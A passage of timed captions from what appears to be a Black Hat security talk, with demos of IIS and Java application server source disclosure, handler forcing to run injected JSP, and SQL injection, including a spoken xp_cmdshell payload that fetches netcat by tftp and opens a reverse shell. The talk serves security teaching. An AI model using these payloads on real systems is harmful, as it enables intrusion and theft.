    "end": "1808760"
  },
  {
    "text": "sir yes just one questioning",
    "start": "1808760",
    "end": "1814480"
  },
  {
    "text": "PRP the ETC is that independent of operating",
    "start": "1818320",
    "end": "1824679"
  },
  {
    "text": "system is thatly based on uh yes the the question is uh the",
    "start": "1824679",
    "end": "1832360"
  },
  {
    "text": "uppercase JSP bug was specific only to Windows NT uh the application server",
    "start": "1832360",
    "end": "1838039"
  },
  {
    "text": "running on Windows n and his question is are these bugs in the previous slide just skip up by one yeah are these bugs",
    "start": "1838039",
    "end": "1845240"
  },
  {
    "text": "also sensitive to the fact that it's on Windows n no this is purely a bug",
    "start": "1845240",
    "end": "1851120"
  },
  {
    "text": "arising because of improper URL parsing and improper configuration file",
    "start": "1851120",
    "end": "1857480"
  },
  {
    "text": "directives any operating system Solaris a an Linux will fall prey to this this is",
    "start": "1857480",
    "end": "1863799"
  },
  {
    "text": "especially an application server bug we we've seen these are most popular",
    "start": "1863799",
    "end": "1869799"
  },
  {
    "text": "Java web servers Java application servers and the way they're designed like the same flaw can be found in most",
    "start": "1869799",
    "end": "1876559"
  },
  {
    "text": "Java application servers like another uh one slide back please another example of",
    "start": "1876559",
    "end": "1882880"
  },
  {
    "text": "source code disclosure is the famous uh plus. HTR bug which came out uh we came",
    "start": "1882880",
    "end": "1888480"
  },
  {
    "text": "out the last time blackhe hat was here last July I remember it I was sitting in that other room happily playing with this thing uh this bug uh causes uh",
    "start": "1888480",
    "end": "1898639"
  },
  {
    "text": "source code disclosure for ASP or ASA files as long as it does not encounter a",
    "start": "1898639",
    "end": "1903960"
  },
  {
    "text": "percentage character is is a little quirky but uh especially if you target",
    "start": "1903960",
    "end": "1909120"
  },
  {
    "text": "it against global.asa you might get uh contents of it cuz global.asa sometimes",
    "start": "1909120",
    "end": "1915679"
  },
  {
    "text": "has directives written with uh SK script run at equal to server instead of the percentage tax do a quick demo of that",
    "start": "1915679",
    "end": "1923720"
  },
  {
    "text": "excuse me so on 1012 first I try to look for global.asa",
    "start": "1923720",
    "end": "1930919"
  },
  {
    "text": "as it is and it'll say request for global.asa not allowed fine we put a plus. HTR at",
    "start": "1930919",
    "end": "1939639"
  },
  {
    "text": "the end and apparently we get nothing on our screen but if we do a source display",
    "start": "1939639",
    "end": "1946080"
  },
  {
    "text": "view Source we have the entire contents of uh the ASA file in here also we we",
    "start": "1946080",
    "end": "1952279"
  },
  {
    "text": "can have information like dsns embedded in here which is global to all applications we have passwords like",
    "start": "1952279",
    "end": "1959039"
  },
  {
    "text": "getting this uh gives us a huge Treasure of backend information with",
    "start": "1959039",
    "end": "1964200"
  },
  {
    "text": "us uh hang on let me reposition this",
    "start": "1964200",
    "end": "1969360"
  },
  {
    "text": "mic how does this thing work uh on URLs the plus character means a",
    "start": "1971639",
    "end": "1978519"
  },
  {
    "text": "space you signify space with either percentage 20 or the plus sign it's okay",
    "start": "1978519",
    "end": "1984120"
  },
  {
    "text": "I don't worry U so what happens is the URL translates to be HTTP IP address",
    "start": "1984120",
    "end": "1990960"
  },
  {
    "text": "global.asa space. HTR and the way I parses the URL",
    "start": "1990960",
    "end": "1997159"
  },
  {
    "text": "it looks at the last extension it's what HTR but when it tries to find the file it only takes stuff up to the first",
    "start": "1997159",
    "end": "2004000"
  },
  {
    "text": "space and ends there and HD directives h requests are passed by ISM the internet",
    "start": "2004000",
    "end": "2010559"
  },
  {
    "text": "service manager and that does not know how to inter interpret ASA files so it",
    "start": "2010559",
    "end": "2016320"
  },
  {
    "text": "just throws the source code in the Raw next slide other methods and means of source",
    "start": "2016320",
    "end": "2024159"
  },
  {
    "text": "code disclosures can be poorly written applications themselves like applications uh which are uh which are",
    "start": "2024159",
    "end": "2031799"
  },
  {
    "text": "sort of based on a driver template which which you know pull out different files to read and then dis display formatted",
    "start": "2031799",
    "end": "2038760"
  },
  {
    "text": "content within them like you see you see all these news sites like CNET or Yahoo",
    "start": "2038760",
    "end": "2044760"
  },
  {
    "text": "news they'll always have a standard looking template with a ad at the top a sidebar and everything and the stories",
    "start": "2044760",
    "end": "2050200"
  },
  {
    "text": "in the middle like those won't be all HTML files all static HTML files it'll",
    "start": "2050200",
    "end": "2056839"
  },
  {
    "text": "be a central template script is pulling out content from somewhere else and just formatting it and showing it well if the",
    "start": "2056839",
    "end": "2064158"
  },
  {
    "text": "script is not written well you can aim the script at any arbitrary file and pull out its content and it'll show you",
    "start": "2064159",
    "end": "2070638"
  },
  {
    "text": "in a nice formatted manner uh on is 40 there's these files which get installed",
    "start": "2070639",
    "end": "2077158"
  },
  {
    "text": "with examples show code. ASP and code browse. ASP these are meant to pretty",
    "start": "2077159",
    "end": "2083720"
  },
  {
    "text": "print source code for the sample sites that I came with for so that developers",
    "start": "2083720",
    "end": "2089079"
  },
  {
    "text": "can follow well they don't do proper file checking file path checking so",
    "start": "2089079",
    "end": "2094440"
  },
  {
    "text": "people can actually jump the web route next slide you can actually use show code. ASP like",
    "start": "2094440",
    "end": "2100480"
  },
  {
    "text": "this you say source is equal to/ madc SL do do SL do do SL do dot jump out of the",
    "start": "2100480",
    "end": "2106839"
  },
  {
    "text": "web rout enter into any path and P pull out any file name next slide like over",
    "start": "2106839",
    "end": "2113800"
  },
  {
    "text": "here I'm pulling out uh uh I'm pulling out a file called",
    "start": "2113800",
    "end": "2120359"
  },
  {
    "text": "upload. ASP which is in my web rout and seeing all the source code which shouldn't be so",
    "start": "2120359",
    "end": "2125520"
  },
  {
    "text": "shown next slide so this was a little bit quick introduction about uh source code",
    "start": "2125520",
    "end": "2132280"
  },
  {
    "text": "disclosure attacks I mean by no means is this this whole rendering complete there's so many other ways and means but",
    "start": "2132280",
    "end": "2140359"
  },
  {
    "text": "uh we want to leave those and proceed on to some more interesting things so the",
    "start": "2140359",
    "end": "2146000"
  },
  {
    "text": "next category of attacks uh we found is attacks which uh hit the web server",
    "start": "2146000",
    "end": "2152160"
  },
  {
    "text": "architecture like the way in which a web server is implemented or configured or the way all the components fit together",
    "start": "2152160",
    "end": "2159880"
  },
  {
    "text": "there are some holes where you can bypass the way components interact and",
    "start": "2159880",
    "end": "2166800"
  },
  {
    "text": "choose your own uh paths into components uh I'll explain better with a diagram in",
    "start": "2166800",
    "end": "2173720"
  },
  {
    "text": "next slide here's how uh web servers are made off typically you have uh a front end",
    "start": "2173720",
    "end": "2180520"
  },
  {
    "text": "process which handles requests and you have handlers or components for handlers",
    "start": "2180520",
    "end": "2186960"
  },
  {
    "text": "within the web server code so different types of resources get passed with different handlers for HTML you have a",
    "start": "2186960",
    "end": "2194720"
  },
  {
    "text": "Handler which throws the text HTML header let's say for cgis you have a",
    "start": "2194720",
    "end": "2200160"
  },
  {
    "text": "Handler which actually Forks off a bin shell or Pearl or whatever CGI",
    "start": "2200160",
    "end": "2205560"
  },
  {
    "text": "interpreter is used runs the code throws the header and sends the output back for",
    "start": "2205560",
    "end": "2211800"
  },
  {
    "text": "GSP Java server Pages actually the code gets fired off to a Java compiler",
    "start": "2211800",
    "end": "2217599"
  },
  {
    "text": "compiles it into a class file fires off the class file to the Java runtime",
    "start": "2217599",
    "end": "2222680"
  },
  {
    "text": "executes it and uh sends the output on its way back so and there's a central",
    "start": "2222680",
    "end": "2228480"
  },
  {
    "text": "configuration or logic lying in the main process which directs which Handler",
    "start": "2228480",
    "end": "2233560"
  },
  {
    "text": "should pick up which kind of resource well if you try to attack the architecture you can mix up the handlers",
    "start": "2233560",
    "end": "2240440"
  },
  {
    "text": "you can force any kind of Handler onto any kind of resource and this we've seen",
    "start": "2240440",
    "end": "2245880"
  },
  {
    "text": "is a common case with a lot of jav application servers Shri was instrumental in finding these out as",
    "start": "2245880",
    "end": "2252280"
  },
  {
    "text": "well next slide so what we're trying to do is trying to",
    "start": "2252280",
    "end": "2258200"
  },
  {
    "text": "force handlers which are not meant for the resource and actually see what results",
    "start": "2258200",
    "end": "2264240"
  },
  {
    "text": "do we get so let us say if we have a CGI file which is supposed to be interpreted",
    "start": "2264240",
    "end": "2271040"
  },
  {
    "text": "and we actually Force the default Handler on the CGI file what's going to happen the CGI won't get into",
    "start": "2271040",
    "end": "2277480"
  },
  {
    "text": "interpreted instead all the source code will be thrown out in in in an unpassed",
    "start": "2277480",
    "end": "2283520"
  },
  {
    "text": "Manner and go delivered back to your browser so that would cause a source code disclosure bug which uh I just do a",
    "start": "2283520",
    "end": "2291079"
  },
  {
    "text": "quick",
    "start": "2291079",
    "end": "2293359"
  },
  {
    "text": "demo okay there we are um I have uh on",
    "start": "2300040",
    "end": "2305960"
  },
  {
    "text": "10112 on Port 8080 I have Sun Java web server running",
    "start": "2305960",
    "end": "2312040"
  },
  {
    "text": "and there's another file I have called hello jws",
    "start": "2312040",
    "end": "2318200"
  },
  {
    "text": "JSP similar kind of a file it says uh welcome to Black Hat's demo running on",
    "start": "2318720",
    "end": "2324079"
  },
  {
    "text": "Java web server now if I want to cause a source code disclosure with this I can",
    "start": "2324079",
    "end": "2330359"
  },
  {
    "text": "forcibly invoke the file serlet to process this GSP file the way I do it is",
    "start": "2330359",
    "end": "2336720"
  },
  {
    "text": "I prefix the URL with serlet let and then I go into the path of the",
    "start": "2336720",
    "end": "2344680"
  },
  {
    "text": "Java archive file so I go com. sun. server. HTTP do",
    "start": "2344680",
    "end": "2354160"
  },
  {
    "text": "serlet serlet do file serlet over well it has completed the tag so you actually go",
    "start": "2355000",
    "end": "2363760"
  },
  {
    "text": "into the Java archive pick out whatever serlet you want and force it onto a kind",
    "start": "2363760",
    "end": "2369960"
  },
  {
    "text": "of a resource so over here if I force this serlet on hello jws",
    "start": "2369960",
    "end": "2377079"
  },
  {
    "text": "JSP it's going to ask me to save the file because it doesn't have the MIM types I'll just say save file I'll save",
    "start": "2377079",
    "end": "2384680"
  },
  {
    "text": "it as uh temp. JSP save let's see if it did save it",
    "start": "2384680",
    "end": "2392440"
  },
  {
    "text": "so temp. GSP yes it is there and if I say say type temp. JSP and here's the",
    "start": "2392440",
    "end": "2401359"
  },
  {
    "text": "content of the file so here's an example of a Handler forcing causing source code",
    "start": "2401359",
    "end": "2408680"
  },
  {
    "text": "disclosure what if we think of the other way around what if we force a Java",
    "start": "2408680",
    "end": "2415359"
  },
  {
    "text": "Handler on a non Java file what's that going to do next slide so we're trying to force a JSP",
    "start": "2415359",
    "end": "2422520"
  },
  {
    "text": "Handler onto a plain HTML file what would that do that will cause cuse the",
    "start": "2422520",
    "end": "2427640"
  },
  {
    "text": "HTML file to be actually compiled whether it makes sense or not is not to",
    "start": "2427640",
    "end": "2433040"
  },
  {
    "text": "not for us to see but the Java compiler is going to try to compile the HTML file",
    "start": "2433040",
    "end": "2438280"
  },
  {
    "text": "see if it generates any bite code and run it what this means is if we are able to send input to an HTML file like from",
    "start": "2438280",
    "end": "2447640"
  },
  {
    "text": "remote from an application or from a web interface then we can actually use such",
    "start": "2447640",
    "end": "2453119"
  },
  {
    "text": "kinds of Handler forcing to get that HTML and embedded Java code compiled and",
    "start": "2453119",
    "end": "2458480"
  },
  {
    "text": "executed next slide again we use the/ serlet prefix on",
    "start": "2458480",
    "end": "2464760"
  },
  {
    "text": "sun Java web server we have a page compile serlet which uh compiles and",
    "start": "2464760",
    "end": "2470160"
  },
  {
    "text": "runs Java server Pages we'll try and force that in next slide now here's the",
    "start": "2470160",
    "end": "2475880"
  },
  {
    "text": "whole syntax use SL serlet sloms sun. server. hp. page compile JSP runtime.",
    "start": "2475880",
    "end": "2484319"
  },
  {
    "text": "JSP serlet the whole thing and force it on to any file that lies within your web",
    "start": "2484319",
    "end": "2489560"
  },
  {
    "text": "application route a classic case where you can do this is applications like a",
    "start": "2489560",
    "end": "2494880"
  },
  {
    "text": "guest book or a bulletin board that take inputs from a user and post it into an",
    "start": "2494880",
    "end": "2500119"
  },
  {
    "text": "HTML file so that everybody can see lot of Internet applications would do that",
    "start": "2500119",
    "end": "2505240"
  },
  {
    "text": "lot of applications that store temporary data would also do this like if your data is stored in transit in temp files",
    "start": "2505240",
    "end": "2512160"
  },
  {
    "text": "and if you're able to figure out where these temp files are you can force a Handler and get them compiled and this",
    "start": "2512160",
    "end": "2517680"
  },
  {
    "text": "will cause arbitrary code execution next slide so here's how the whole concept looks like um you have an HTML file",
    "start": "2517680",
    "end": "2525160"
  },
  {
    "text": "instead of it getting passed by the HTML Handler you ask the Java compiler to",
    "start": "2525160",
    "end": "2530240"
  },
  {
    "text": "look at it by forcing the Handler get it executed and sent back I give you a quick little",
    "start": "2530240",
    "end": "2535839"
  },
  {
    "text": "demo skip to the next slide in Sun Java web server it comes uh preconfigured",
    "start": "2535839",
    "end": "2542480"
  },
  {
    "text": "with a bullettin board sample",
    "start": "2542480",
    "end": "2548200"
  },
  {
    "text": "so I'm going to open up a Java web server over here",
    "start": "2548200",
    "end": "2554160"
  },
  {
    "text": "8080 here's the main page of java web server let's look at the sample",
    "start": "2554160",
    "end": "2560480"
  },
  {
    "text": "applications go to Applications it has a bulletin",
    "start": "2560480",
    "end": "2565640"
  },
  {
    "text": "board and here's what the bulletin board does anything that you type in the bulletin board will get posted for",
    "start": "2566640",
    "end": "2572760"
  },
  {
    "text": "everyone to see let's go to the next slide and here's",
    "start": "2572760",
    "end": "2577880"
  },
  {
    "text": "the comments that I want to post in the bulletin board a long set of GSP code",
    "start": "2577880",
    "end": "2584240"
  },
  {
    "text": "what it does is it uh creates a runtime process and gives the exec method to it",
    "start": "2584240",
    "end": "2591520"
  },
  {
    "text": "and in the exec method you type the command that you want the shell to execute it creates a little buffered",
    "start": "2591520",
    "end": "2597480"
  },
  {
    "text": "reader which reads and write the input input output streams and there's a little little Clause that catches an",
    "start": "2597480",
    "end": "2604000"
  },
  {
    "text": "exception if any and it just prints the input output stream back to you so if we",
    "start": "2604000",
    "end": "2610359"
  },
  {
    "text": "inject this GSP code into the HTML file and get it compiled we've got remote",
    "start": "2610359",
    "end": "2615640"
  },
  {
    "text": "command execution so I'm going to do just that I have uh I have all the code",
    "start": "2615640",
    "end": "2621359"
  },
  {
    "text": "with me I'm going to just cut and paste it out of this",
    "start": "2621359",
    "end": "2627040"
  },
  {
    "text": "file and paste the whole thing over here and the command I'm going to",
    "start": "2627400",
    "end": "2634079"
  },
  {
    "text": "run is uh just a simple directory command CMD /",
    "start": "2634079",
    "end": "2640800"
  },
  {
    "text": "CD I'm going to post this so you say post to the",
    "start": "2640800",
    "end": "2646520"
  },
  {
    "text": "board okay the postings appear over here and now let us look at",
    "start": "2646520",
    "end": "2653440"
  },
  {
    "text": "uh just the file board. HTML we just going to reference the file to see if it made it there yes it",
    "start": "2653440",
    "end": "2660920"
  },
  {
    "text": "did and now we'll Force compile the whole thing so we'll go serlet okay I have it over here already serlet /c com.",
    "start": "2660920",
    "end": "2668839"
  },
  {
    "text": "sun. server. HTTP page compile JSP runtime JSP serlet and aim it to board.",
    "start": "2668839",
    "end": "2674880"
  },
  {
    "text": "HTML hit enter it compile it it ran the directory",
    "start": "2674880",
    "end": "2680040"
  },
  {
    "text": "command gives you all the output in the browser so it's not pretty formatted but",
    "start": "2680040",
    "end": "2685280"
  },
  {
    "text": "uh imagine if you use uh you just open up a back connection to yourself or",
    "start": "2685280",
    "end": "2690680"
  },
  {
    "text": "something that's uh that way you've got a command prompt in in almost no time Java web server on ENT runs as",
    "start": "2690680",
    "end": "2699240"
  },
  {
    "text": "system service or administrator level service if it's installed default so you already have system or administrator",
    "start": "2699240",
    "end": "2707079"
  },
  {
    "text": "privileges on sun on on Solaris people install it and run it as root and uh",
    "start": "2707079",
    "end": "2713680"
  },
  {
    "text": "guess what you get root shells out of this one so this is a pretty neat trick uh",
    "start": "2713680",
    "end": "2719440"
  },
  {
    "text": "there there's a lot of uh lot of Java application servers which have an upload serlet or a post serlet there's one",
    "start": "2719440",
    "end": "2726359"
  },
  {
    "text": "called serlet exact from UniFi that does this web logic has something like this",
    "start": "2726359",
    "end": "2731720"
  },
  {
    "text": "all these fall prey to such attacks next slide here's a code on on on the Unix uh",
    "start": "2731720",
    "end": "2739280"
  },
  {
    "text": "if it was running on Unix without xterms what I can this this string would launch",
    "start": "2739280",
    "end": "2744760"
  },
  {
    "text": "me a reverse tet connection yes I would assume You' been",
    "start": "2744760",
    "end": "2751160"
  },
  {
    "text": "try uh big a paron if if I try this against is5 yeah this of behavior you're",
    "start": "2754440",
    "end": "2761760"
  },
  {
    "text": "able to okay your question is uh can I try to",
    "start": "2761760",
    "end": "2768880"
  },
  {
    "text": "force have I found that I'm able to force handlers on is5 or something like",
    "start": "2768880",
    "end": "2774200"
  },
  {
    "text": "that not uh not directly no but uh if we go back to that global.asa bug the plus",
    "start": "2774200",
    "end": "2782119"
  },
  {
    "text": "HDR that is kind of an indirect way of forcing a Handler the only catches for I",
    "start": "2782119",
    "end": "2788960"
  },
  {
    "text": "I don't know how the components are laid out or it's difficult cuz it's it's closed Source it's hard to find out",
    "start": "2788960",
    "end": "2795079"
  },
  {
    "text": "where the right what are the right DLS and how do they get invoked with various means for Java application servers it",
    "start": "2795079",
    "end": "2802240"
  },
  {
    "text": "was pretty easy because you have the whole Java archive and you pass the code through a Java DC compiler like bam it",
    "start": "2802240",
    "end": "2808400"
  },
  {
    "text": "gives you the code with pretty much the variables obus skated but you get you",
    "start": "2808400",
    "end": "2813559"
  },
  {
    "text": "get it pretty easily so no the answer is not yet on is5 or is4 I personally or we",
    "start": "2813559",
    "end": "2820920"
  },
  {
    "text": "from foundstone haven't been able to find any so that that's like the best I",
    "start": "2820920",
    "end": "2826960"
  },
  {
    "text": "can probably think of next",
    "start": "2826960",
    "end": "2833680"
  },
  {
    "text": "slide so that brings us to another category of attacks uh quick look at SQL",
    "start": "2833680",
    "end": "2839359"
  },
  {
    "text": "query poisoning and I mean these attacks are pretty trivial uh it's it's it's no",
    "start": "2839359",
    "end": "2845880"
  },
  {
    "text": "rocket science to p these attacks off but in the industry this kind of vulnerability is very rampant and I'll",
    "start": "2845880",
    "end": "2853119"
  },
  {
    "text": "explain why uh over here you have uh I have a source code of U of of an asp",
    "start": "2853119",
    "end": "2861319"
  },
  {
    "text": "page what it does it it tries to take input from the query string that is sent",
    "start": "2861319",
    "end": "2868319"
  },
  {
    "text": "to the ASP page with some parameters takes the parameters over here the",
    "start": "2868319",
    "end": "2873440"
  },
  {
    "text": "parameter is called ID and it puts the parameter right right into the SQL query",
    "start": "2873440",
    "end": "2878720"
  },
  {
    "text": "string so it says select star from product where ID is equal to something",
    "start": "2878720",
    "end": "2884079"
  },
  {
    "text": "concatenated with whatever ID parameter is on the query string now this is um",
    "start": "2884079",
    "end": "2890800"
  },
  {
    "text": "very weak programming why is because you don't know what is coming in this ID string it might be a genuine ID or it",
    "start": "2890800",
    "end": "2898640"
  },
  {
    "text": "might be an extended string so let's see what happens stay on this slide I'll",
    "start": "2898640",
    "end": "2904240"
  },
  {
    "text": "I'll pop open a quick demo over here um so I have",
    "start": "2904240",
    "end": "2909800"
  },
  {
    "text": "HTTP 10 00011 and web store.",
    "start": "2909800",
    "end": "2916599"
  },
  {
    "text": "HTML over here I have a quick uh you know mockup of an online Art Gallery",
    "start": "2916839",
    "end": "2922640"
  },
  {
    "text": "which sells paintings on the web that uh you can browse through and such so let",
    "start": "2922640",
    "end": "2927920"
  },
  {
    "text": "let me pick out uh this one golden Sunset if I click on this it'll give me",
    "start": "2927920",
    "end": "2933400"
  },
  {
    "text": "details of the picture hello there it is okay so here's an asp",
    "start": "2933400",
    "end": "2941599"
  },
  {
    "text": "file uh over here it's called show table. ASP and on the URL it has it is show",
    "start": "2941599",
    "end": "2948880"
  },
  {
    "text": "table. ASP question mark ID is equal to 2 and pick is equal to Tahoe 1 so from",
    "start": "2948880",
    "end": "2956880"
  },
  {
    "text": "looking at the URL we can guess that uh some sort of a query is being made to the back end to retrieve item number two",
    "start": "2956880",
    "end": "2964880"
  },
  {
    "text": "product ID is two and show the picture as Tahoe one so if we just play with",
    "start": "2964880",
    "end": "2970440"
  },
  {
    "text": "these parameters we'd be able to you know get some different things let let me just change it to ID is equal to 3 if",
    "start": "2970440",
    "end": "2977839"
  },
  {
    "text": "I say ID is equal to 3 it gives me a different stock number and different product details now instead of three I",
    "start": "2977839",
    "end": "2986160"
  },
  {
    "text": "can extend this just go to the next slide instead of just ID is equal to 3 I",
    "start": "2986160",
    "end": "2992079"
  },
  {
    "text": "can try give a URL like this say ID is equal to 3 plus r + 1 is equal 1 what",
    "start": "2992079",
    "end": "3000079"
  },
  {
    "text": "this would mean is since this whole string gets copied in the SQL query your",
    "start": "3000079",
    "end": "3005280"
  },
  {
    "text": "resultant quer is Select star from product where ID is equal to 3 or 1 is equal to 1 Now 1 is equal to 1 is always",
    "start": "3005280",
    "end": "3011480"
  },
  {
    "text": "true so this will return all rows of the database so if your online store or",
    "start": "3011480",
    "end": "3017079"
  },
  {
    "text": "online bank or whatever it is using this thing you'd be able to dump all the rows",
    "start": "3017079",
    "end": "3022799"
  },
  {
    "text": "or all the accounts or whatever sensitive information you have in the database and I don't need command line",
    "start": "3022799",
    "end": "3028640"
  },
  {
    "text": "privileges to pull data out I'll just use the faulty programming in",
    "start": "3028640",
    "end": "3033880"
  },
  {
    "text": "there uh it can go a step even better next slide like who says I want to do",
    "start": "3033880",
    "end": "3040200"
  },
  {
    "text": "retrieve all rows i' just drop the table so off it",
    "start": "3040200",
    "end": "3046160"
  },
  {
    "text": "goes now why would this be why would this work like if a smart person",
    "start": "3046160",
    "end": "3052440"
  },
  {
    "text": "programs it a drop table won't work because the database B is not supposed",
    "start": "3052440",
    "end": "3057559"
  },
  {
    "text": "to run as system administrator but these days you have uh",
    "start": "3057559",
    "end": "3062960"
  },
  {
    "text": "a whole set of programmers the what what shall I say this whole zero knowledge",
    "start": "3062960",
    "end": "3069599"
  },
  {
    "text": "Administration zero knowledge point and click programming has brought about zero knowledge administrators and zero",
    "start": "3069599",
    "end": "3076720"
  },
  {
    "text": "knowledge programmers who don't know what the hell they're",
    "start": "3076720",
    "end": "3082318"
  },
  {
    "text": "doing so all those guys burn sorry for being melodramatic but this is",
    "start": "3084079",
    "end": "3090520"
  },
  {
    "text": "true people want to take their legacy business put it on the web because what",
    "start": "3090520",
    "end": "3096559"
  },
  {
    "text": "everybody else is doing it all the financial houses in Wall Street they all want to get on the web they don't have",
    "start": "3096559",
    "end": "3102559"
  },
  {
    "text": "any expertise cuz they've been dealing with money not machine code so they hire",
    "start": "3102559",
    "end": "3108079"
  },
  {
    "text": "third party agencies to you know temporary bring on Consultants or Developers for hire they sitting there",
    "start": "3108079",
    "end": "3115720"
  },
  {
    "text": "for 6 months cook up some code go away and wh their companies on the web um how",
    "start": "3115720",
    "end": "3122040"
  },
  {
    "text": "how did they come up with the code they were just uh they were just looking at teach yourself ASP in 21 days or teach",
    "start": "3122040",
    "end": "3129440"
  },
  {
    "text": "yourself SQL server in 30 minutes they these books come with CDs",
    "start": "3129440",
    "end": "3135440"
  },
  {
    "text": "or with companion websites so guess what I don't even have to type the code I'll steal it right from there the books come",
    "start": "3135440",
    "end": "3141400"
  },
  {
    "text": "with lame examples I mean the books are not supposed to come with secure coding examples Cu uh why why bother the",
    "start": "3141400",
    "end": "3147760"
  },
  {
    "text": "authors you know leave them alone so they just cut and paste the examples change the names change the formatting",
    "start": "3147760",
    "end": "3153640"
  },
  {
    "text": "and their application works the manager at the company says okay fine it's all",
    "start": "3153640",
    "end": "3158760"
  },
  {
    "text": "working nobody tested it they made their deadlines they go off do another job",
    "start": "3158760",
    "end": "3163960"
  },
  {
    "text": "this code is lying whose responsibil is like they came developed it they went away the manager is in custody of the",
    "start": "3163960",
    "end": "3170440"
  },
  {
    "text": "code she doesn't know what to do with that code it's just going to be there I mean it's going to be backed up forever",
    "start": "3170440",
    "end": "3176240"
  },
  {
    "text": "but it's going to be there and such sloppy programming sneaks in I mean just",
    "start": "3176240",
    "end": "3181760"
  },
  {
    "text": "go on the web and see so many sites will fall prey to these kind of Errors you'll",
    "start": "3181760",
    "end": "3187480"
  },
  {
    "text": "be able to just mingle around parameters and SQL queries and you'll end up with",
    "start": "3187480",
    "end": "3193119"
  },
  {
    "text": "so much information it's it's shameful so and this is sloppy programming this",
    "start": "3193119",
    "end": "3199000"
  },
  {
    "text": "nobody else's fault and they leave the database in connected as saay system",
    "start": "3199000",
    "end": "3204520"
  },
  {
    "text": "administrator and sometimes it's even with a blank password which is who's going to connect to it from the web so",
    "start": "3204520",
    "end": "3210119"
  },
  {
    "text": "let's keep a blank password you know so oh well sa means I don't have to make sure that this application has this",
    "start": "3210119",
    "end": "3216440"
  },
  {
    "text": "privilege or this database has that privilege they'll just everything works every everything is accessible and since",
    "start": "3216440",
    "end": "3223240"
  },
  {
    "text": "you have essay privileges you can do tricks like this instead of drop table I'll go exec Master do. xpor command",
    "start": "3223240",
    "end": "3232319"
  },
  {
    "text": "shell is a stored procedure in SQL Server which is not a available to anyone but essay but uh our genius",
    "start": "3232319",
    "end": "3239760"
  },
  {
    "text": "programmers left it there left it running as essay and then I give any any",
    "start": "3239760",
    "end": "3245559"
  },
  {
    "text": "command uh any shell command that I want in this case I'm doing tftp from a",
    "start": "3245559",
    "end": "3251520"
  },
  {
    "text": "separate machine so the the server goes out tfps out to a server downloads",
    "start": "3251520",
    "end": "3257520"
  },
  {
    "text": "netcat and fires up a command shell back to me next slide so here's how the whole",
    "start": "3257520",
    "end": "3263280"
  },
  {
    "text": "thing is going to work I'm going to give you a quick demo of this is from the browser you poison the SQL query causes",
    "start": "3263280",
    "end": "3270280"
  },
  {
    "text": "is and SQL Server to go out to tftp server download netcat and fire back the",
    "start": "3270280",
    "end": "3277359"
  },
  {
    "text": "command prompt on my listener so let me just quickly do that and I hope it",
    "start": "3277359",
    "end": "3284200"
  },
  {
    "text": "works so over here I have my listener on Port",
    "start": "3284559",
    "end": "3289920"
  },
  {
    "text": "2001 and over here instead of ID is equal to 3 or 1 is equal to 1 I do IID",
    "start": "3289920",
    "end": "3296440"
  },
  {
    "text": "is equal to 3 percentage 01 exec plus master dot do xpor CMD",
    "start": "3296440",
    "end": "3305559"
  },
  {
    "text": "shell plus uh all these plus signs are spaces so tftp minus I uh",
    "start": "3305559",
    "end": "3314680"
  },
  {
    "text": "10. 0.0.3 that's where my tftp server is get",
    "start": "3314680",
    "end": "3320359"
  },
  {
    "text": "net cat.exe I give percentage 26 percentage",
    "start": "3320359",
    "end": "3325480"
  },
  {
    "text": "26 that's that's ENT sign uh",
    "start": "3325480",
    "end": "3330760"
  },
  {
    "text": "netcat uh minus E CMD do exe my IP address is 10.0.0 do1 my port",
    "start": "3330760",
    "end": "3340319"
  },
  {
    "text": "is 2001 I hope I haven't made an error in typing so with",
    "start": "3340319",
    "end": "3347799"
  },
  {
    "text": "this it's it's working uh and over here you notice this thing came back to us it",
    "start": "3347799",
    "end": "3354280"
  },
  {
    "text": "downloaded netcat gave us the pro so I can do whatever I want on This Server it's owned through the",
    "start": "3354280",
    "end": "3361599"
  },
  {
    "text": "web for because of that stupid programmers fault well in this case I won't call the",
    "start": "3361599",
    "end": "3368200"
  },
  {
    "text": "programmer stupid cuz I wrote this one but uh just show the IP address is",
    "start": "3368200",
    "end": "3375280"
  },
  {
    "text": "1011 and this is how you can own SQL servers of the web so that's a quick",
    "start": "3375280",
    "end": "3381319"
  },
  {
    "text": "demo for SQL queries um next slide",
    "start": "3381319",
    "end": "3388240"
  },
  {
    "text": "uh let's let's revisit the classic uh mdac attack I mean this has been chewed over and over again but still every time",
    "start": "3388640",
    "end": "3395640"
  },
  {
    "text": "I run it I mean I I feel thrilled it's it's such a neat elegant little thing let me see how am I doing for time yeah",
    "start": "3395640",
    "end": "3403760"
  },
  {
    "text": "we have loads of time okay uh we have time no we okay",
    "start": "3403760",
    "end": "3410720"
  },
  {
    "text": "cool the thank you yeah let's quickly talk about the",
    "start": "3410720",
    "end": "3417640"
  },
  {
    "text": "mdac attack um so written by the bug was discovered by RFP and what mdac does is uh it allows",
    "start": "3417640",
    "end": "3427559"
  },
  {
    "text": "in an nutshell it allows remote users to perform SQL queries without being authenticated you you make direct",
    "start": "3427559",
    "end": "3434079"
  },
  {
    "text": "queries to msad cs. dll with the vbb",
    "start": "3434079",
    "end": "3440079"
  },
  {
    "text": "US server object I I forget I'm not an anti hacker so I don't know the details",
    "start": "3440079",
    "end": "3446559"
  },
  {
    "text": "very well but what we need to know is we need to know the DSN and we need to have we need to see if msad cs. dll is",
    "start": "3446559",
    "end": "3455039"
  },
  {
    "text": "actually present and it executes and it's the vulnerable version and the",
    "start": "3455039",
    "end": "3460400"
  },
  {
    "text": "script the exploit script performs SQL queries which pipe things to a shell",
    "start": "3460400",
    "end": "3466200"
  },
  {
    "text": "next slide so here's the here's some excerpts from the exploit script it does a select",
    "start": "3466200",
    "end": "3471960"
  },
  {
    "text": "star from customers where city is equal to something pipe it with shell and give",
    "start": "3471960",
    "end": "3479559"
  },
  {
    "text": "your own command over here and it targets a lot of default DSN that come",
    "start": "3479559",
    "end": "3485680"
  },
  {
    "text": "installed by default or they might be present there if if this thing uh executes you gain administrator",
    "start": "3485680",
    "end": "3492480"
  },
  {
    "text": "privileges on an anti system privileges so I'm going to quickly run that attack",
    "start": "3492480",
    "end": "3497920"
  },
  {
    "text": "for you let's go to the next slide we're going to do the same thing we're going to uh we're going to give a command with",
    "start": "3497920",
    "end": "3506200"
  },
  {
    "text": "which causes the is server to go out tftp netcat and throw it back at us",
    "start": "3506200",
    "end": "3512640"
  },
  {
    "text": "really quick so I'm going to open up a listener over here on Port 2001 I'm going to go",
    "start": "3512640",
    "end": "3519640"
  },
  {
    "text": "to my Unix system um exploits inac and I have a preconfigured script",
    "start": "3519640",
    "end": "3528240"
  },
  {
